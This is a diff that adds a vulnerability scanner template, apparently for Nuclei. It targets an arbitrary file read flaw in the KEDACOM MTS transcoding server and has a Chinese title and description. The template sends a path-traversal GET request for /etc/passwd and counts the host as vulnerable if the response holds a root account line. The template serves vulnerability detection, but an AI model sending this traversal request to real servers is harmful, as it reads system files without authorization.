@@ -1,0 +1,27 @@
+id: kedacom-mts-file-read
+
+info:
+  name: 科达 MTS转码服务器 任意文件读取
+  author: HuanXiong
+  severity: high
+  description: |
+    KEDACOM MTS转码服务器存在任意文件读取漏洞，攻击这通过漏洞可以读取服务器任意信息
+    app="MTS转码服务器"
+
+  tags: File Reading
+
+http:
+  - raw:
+      - |
+        GET /../../../../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - 'root:.*:0'
+
+      - type: status
+        status:
+          - 200
